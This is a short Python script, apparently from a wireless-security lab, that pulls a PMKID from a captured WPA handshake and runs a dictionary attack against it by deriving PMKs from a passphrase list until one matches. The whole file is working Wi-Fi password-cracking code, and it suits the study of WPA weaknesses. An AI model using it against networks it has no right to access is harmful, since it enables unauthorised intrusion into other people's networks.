#!/usr/bin/env python3
# -*- coding: utf-8 -*-

__author__      = "Gabriel Roch & Cassandre Wojciechowski"

from scapy.all import *
from binascii import a2b_hex, b2a_hex
from pbkdf2 import *
import hmac, hashlib

# Reading the pcap file
cap = rdpcap("PMKID_handshake.pcap")

# Find the SSID
ssid = cap[0].info

"""
TO DO : récupérer dynamiquement les adresses MAC de l'AP et du client ?

for packet in wpa :
    # The first packet with type, subtype and proto at 0 is an Association Request
    # It contains part of the info we seek (MAC address of AP and STA and ssid)
    # We check if the packet is and Asso Req from the network we want to attack
    if (packet.type == 0x2) and (packet.subtype == 0x8) and (packet.proto == 0x0) and (packet.info == ssid):
        # AP MAC address
        APmac = a2b_hex((packet.addr1).replace(":", ""))
        # STA MAC address
        Clientmac = a2b_hex((packet.addr2).replace(":", ""))
        break
"""

# The PMKID is contained in packet 146 (Key Exchange Packet 1 of 4)
packet = cap[145]
# Storing the client and the AP's MAC addresses
Clientmac = a2b_hex((packet.addr1).replace(":", ""))
APmac = a2b_hex((packet.addr2).replace(":", ""))
# Storing the PMKID sent by the AP
pmkid = raw(packet)[-20:-4]

# Create a list of passphrases from a text file
with open('passphrases.txt') as file :
    for passPhrase in file.readlines() :
        passPhrase = passPhrase.strip()

        # Calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        pmk = pbkdf2(hashlib.sha1, passPhrase.encode(), ssid, 4096, 32)

        # Calculating a new PMKID from a passphrase
        calc_pmkid = hmac.new(pmk, b"PMK Name" + APmac + Clientmac, hashlib.sha1)
        calc_pmkid = calc_pmkid.digest()[:16]
        print("Passphrase tested : ", passPhrase)

        # Comparing the PMKID calculated with the one found in the pcap file
        if calc_pmkid == pmkid :
            print("PASSPHRASE FOUND : ", passPhrase)
            exit(0)